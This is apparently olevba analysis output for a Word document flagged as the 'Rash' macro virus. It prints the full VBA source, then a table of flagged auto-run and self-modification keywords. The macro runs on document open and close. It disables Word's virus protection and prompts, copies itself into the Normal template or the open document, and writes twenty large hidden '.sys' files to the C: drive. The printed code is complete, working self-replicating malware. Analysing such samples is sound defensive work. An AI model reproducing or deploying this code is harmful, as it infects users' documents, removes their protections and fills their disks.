olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Rash-274760e8efdebceac31f9b355c8d4f64465cff98
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Rash-274760e8efdebceac31f9b355c8d4f64465cff98 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
Nabor = "RASHKILLER"
Rem +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
Rem + Âèðóñíàÿ ëàáîðàòîðèÿ Äàíèëà Èãîðåâà  ã.Ïèò-Ñàíòåðáóðã   1999+
Rem +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
On Error Resume Next

con = "Private Sub Document_Close()"
col = MacroContainer.VBProject.VBComponents.Item(1).CodeModule.CountOfLines

Dim mas(90)

Options.ConfirmConversions = 0
Options.VirusProtection = 0
Options.SaveNormalPrompt = 0
no1 = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1)
no2 = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1)

If no1 <> con Then
Set tst = NormalTemplate.VBProject.VBComponents.Item(1)
ElseIf no2 <> con Then
Set tst = ActiveDocument.VBProject.VBComponents.Item(1)
Else
tst = ""
End If

If tst <> "" Then
  For i = 1 To col
   mas(i) = MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(i, 1)
  Next i
  
  For i = 1 To col
   tst.CodeModule.InsertLines i, mas(i)
  Next i
  
End If

For i = 1 To 20

 nam = "c:\AA"
 
 
  For j = 1 To 6
   kk = 10 * Rnd
   nam = nam + Mid(Nabor, Int(kk), 1)
  Next j
  
 nam = nam + ".sys"
 Open nam For Output As #1
 Seek #1, 65535 * 2
 Print #1,  'Ïðèÿòíîé ðàáîòû'
 Close #1
 
 SetAttr nam, 6
 
Next i

End Sub

Private Sub Document_Open()
 Document_Close
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+
